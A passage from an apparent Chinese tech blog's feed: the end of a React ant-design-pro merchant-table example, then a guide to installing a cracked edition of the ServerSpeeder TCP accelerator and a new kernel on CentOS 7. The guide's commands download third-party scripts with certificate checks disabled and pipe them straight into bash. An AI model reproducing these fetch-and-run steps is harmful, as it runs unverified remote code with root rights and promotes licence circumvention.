    const &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;parkingPayManager: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;QueryAgentData&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; this.props;
    const newdata &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      list: QueryAgentData,
      pagination: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        total: QueryAgentData.length,
        pageSize: 10,// 页面量
        current: 1, // 当前第几页
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;;
    const &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;isLoading, modalVisible, selectedRows, optionChildrenData&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; this.state;
    const columns &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        title: &lt;span class=&quot;s1&quot;&gt;'商户伪码'&lt;/span&gt;,
        dataIndex: &lt;span class=&quot;s1&quot;&gt;'mch_code'&lt;/span&gt;,
        align: &lt;span class=&quot;s1&quot;&gt;'right'&lt;/span&gt;,
        render: text &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;
          text ? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
            text
          &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'无法显示'&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        title: &lt;span class=&quot;s1&quot;&gt;'商户名称'&lt;/span&gt;,
        dataIndex: &lt;span class=&quot;s1&quot;&gt;'business_name'&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        title: &lt;span class=&quot;s1&quot;&gt;'描述信息'&lt;/span&gt;,
        dataIndex: &lt;span class=&quot;s1&quot;&gt;'mch_description'&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        title: &lt;span class=&quot;s1&quot;&gt;'商户的通道码'&lt;/span&gt;,
        dataIndex: &lt;span class=&quot;s1&quot;&gt;'mchc_code'&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        title: &lt;span class=&quot;s1&quot;&gt;'商户支付码'&lt;/span&gt;,
        dataIndex: &lt;span class=&quot;s1&quot;&gt;'mchp_code'&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        title: &lt;span class=&quot;s1&quot;&gt;'商户ID'&lt;/span&gt;,
        dataIndex: &lt;span class=&quot;s1&quot;&gt;'mch_id'&lt;/span&gt;,
        render: text &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;
          text ? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
            text
          &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'AliPay Not MchID'&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;;

    const parentMethods &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      handleAdd: this.handleAdd,
      handleModalVisible: this.handleModalVisible,
      optionChildrenDataTemp: optionChildrenData,
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
      &amp;lt;PageHeaderLayout &lt;span class=&quot;nv&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;商户配置信息&quot;&lt;/span&gt;&amp;gt;
        &amp;lt;Card &lt;span class=&quot;nv&quot;&gt;bordered&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&amp;gt;
          &amp;lt;div &lt;span class=&quot;nv&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;styles.tableList&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&amp;gt;
            &amp;lt;div &lt;span class=&quot;nv&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;styles.tableListOperator&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&amp;gt;
              &amp;lt;Button &lt;span class=&quot;nv&quot;&gt;icon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;plus&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;primary&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;onClick&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt; this.handleModalVisible&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;&amp;gt;
                添加商户配置
              &amp;lt;/Button&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;StandardTable
              &lt;span class=&quot;nv&quot;&gt;selectedRows&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;selectedRows&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
              &lt;span class=&quot;nv&quot;&gt;loading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;isLoading&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
              &lt;span class=&quot;nv&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;newdata&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
              &lt;span class=&quot;nv&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;columns&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            /&amp;gt;
          &amp;lt;/div&amp;gt;
        &amp;lt;/Card&amp;gt;
        &amp;lt;CreateForm &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;...parentMethods&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;modalVisible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;modalVisible&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/&amp;gt;
      &amp;lt;/PageHeaderLayout&amp;gt;
    &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;最终完成这个页面，进行访问查看。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/104d4e32-f0f8-4a54-8f87-a839fce15176.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">本章介绍的是ant-design-pro 使用中遇到的一些问题 以及个人的解决方式，大牛勿喷。</summary></entry><entry><title type="html">优秀的VPS TCP加速软件 —— 一键锐速安装脚本（开心版）</title><link href="http://firsh.me/2018/05/21/serverspeeder91yun-install/" rel="alternate" type="text/html" title="优秀的VPS TCP加速软件 —— 一键锐速安装脚本（开心版）" /><published>2018-05-21T13:49:52+08:00</published><updated>2018-05-21T13:49:52+08:00</updated><id>http://firsh.me/2018/05/21/serverspeeder91yun-install</id><content type="html" xml:base="http://firsh.me/2018/05/21/serverspeeder91yun-install/">&lt;h2 id=&quot;锐速----rmtnss&quot;&gt;锐速 +   RMTNSS&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;系统要求Centos7 64 位 内核 3.10&lt;/li&gt;
  &lt;li&gt;RMTNSS https://github.com/uk0/RMTNSS&lt;/li&gt;
  &lt;li&gt;锐速 https://www.91yun.co/serverspeeder91yun&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;quick-start&quot;&gt;quick start&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#检查系统虚拟化支持&lt;/span&gt;
yum install virt-what -y
&lt;span class=&quot;c&quot;&gt;# 例如返回 kvm&lt;/span&gt;
virt-what
&lt;span class=&quot;c&quot;&gt;# 安装新的内核&lt;/span&gt;
wget --no-check-certificate -O rskernel.sh https://raw.githubusercontent.com/uxh/shadowsocks_bash/master/rskernel.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bash rskernel.sh

&lt;span class=&quot;c&quot;&gt;# 安装锐速&lt;/span&gt;

wget -N --no-check-certificate https://github.com/91yun/serverspeeder/raw/master/serverspeeder-v.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bash serverspeeder-v.sh CentOS 7.1 3.10.0-229.1.2.el7.x86_64 x64 3.11.20.4 serverspeeder_3283

&lt;span class=&quot;c&quot;&gt;#重启锐速&lt;/span&gt;
/serverspeeder/bin/serverSpeeder.sh restart
&lt;span class=&quot;c&quot;&gt;#启动锐速&lt;/span&gt;
/serverspeeder/bin/serverSpeeder.sh start
&lt;span class=&quot;c&quot;&gt;#停止锐速&lt;/span&gt;
/serverspeeder/bin/serverSpeeder.sh stop
&lt;span class=&quot;c&quot;&gt;#查看锐速运行情况&lt;/span&gt;
/serverspeeder/bin/serverSpeeder.sh status
&lt;span class=&quot;c&quot;&gt;# 卸载&lt;/span&gt;
chattr -i /serverspeeder/etc/apx&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /serverspeeder/bin/serverSpeeder.sh uninstall -f

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">锐速 + RMTNSS</summary></entry></feed>